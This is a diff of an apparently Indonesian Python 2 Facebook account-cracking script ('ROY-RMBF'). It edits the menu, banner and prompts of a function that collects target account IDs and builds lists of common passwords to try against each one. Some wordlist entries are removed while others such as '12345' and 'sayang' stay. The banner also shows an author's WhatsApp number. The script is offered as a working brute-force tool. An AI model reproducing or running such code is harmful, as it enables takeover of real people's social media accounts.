@@ -168,7 +168,7 @@ def moch_yayan():
     print ' [%s3%s] Intip dari Total Followers'%(K,N)
     print ' [%s4%s] Intip dari Like Postingan'%(K,N)
     print ' [%s5%s] %sMULAI INTIP%s'%(K,N,H,N)
-    print ' [%s6%s] Crack dengan id random'%(K,N)
+    print ' [%s6%s] Multi Intip dari Teman Publik (%sNew%s)'%(K,N,H,N)
     print ' %s[%s7%s] Cek Informasi Akun FB'%(N,K,N)
     print ' [%s8%s] Cek Hasil Intip'%(K,N)
     print ' [%s9%s] Info %sSC ROY-RMBF'%(K,N,H)
@@ -569,9 +569,18 @@ def crack_random():
 		yayanxd()
 	os.system('clear')
 	print logo
-	print '\n %s[%s!%s] Ketik menu jika ingin ke menu tampilan awal\n'%(N,M,N)
-	print ' %s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m'
-	limt = raw_input(' %s[%s?%s] Berapa Target : %s'%(N,M,N,H))
+	print ' %s[%s*%s] Author   : %sRoy Octa Firdaus'%(N,H,N,K,)
+    	print ' %s[%s*%s] Facebook : %sfacebook.com/JbFbOld'%(N,H,N,K)
+    	print ' %s[%s*%s] Whatsapp : %s081318306972'%(N,H,N,K)
+    	print ' %s[%s*%s] Versi SC : %sV1.0'%(N,H,N,K)
+    	print ' %s=================================================='%(N)
+    	print ' %s[%s*%s] Nama FB : %s%s%s'%(N,H,N,K,nama,N)
+    	print ' %s[%s*%s] ID FB   : %s%s%s'%(N,H,N,K,idfb,N)
+    	print ' %s[%s*%s] IP Anda : %s%s'%(N,H,N,K,IP)
+    	print ' %s=================================================='%(N)
+	print '\n %s[%s!%s] Ketik %smenu %sjika ingin ke menu awal\n'%(N,M,N,H,N)
+	print ' %s=================================================='%(N)
+	limt = raw_input(' %s[%s?%s] Berapa Target : %s'%(N,K,N,H))
 	if limt =='':
 		print ' %s[%s!%s] Wajib Diisi !'%(N,M,N)
 		crack_random()
@@ -1149,7 +1158,7 @@ def crack_random():
 		except KeyError:
 			print ' %s[%s!%s] ID 10 Tidak Ada !'%(N,M,N)
 			
-	print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,str(len(id)),N)
+	print '\n %s[%s*%s] Total ID : %s%s%s' %(N,H,N,M,str(len(id)),N)
 	ask = raw_input(' [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
 	if ask == "Y" or ask == "y":
 		manual()  
@@ -1183,12 +1192,6 @@ def crack_random():
 					pwx.append("12345")
 					pwx.append(ss)
 		    #<---- Pw tambahan bebas mau di isi apa ----->
-					pwx.append("bismillah")
-					pwx.append("rahasia")
-					pwx.append("alhamdulillah")
-					pwx.append("cintaku")
-					pwx.append("sayangku")
-					pwx.append("katasandi")
 					pwx.append("sayang")
 		try:
 			for pw in pwx:
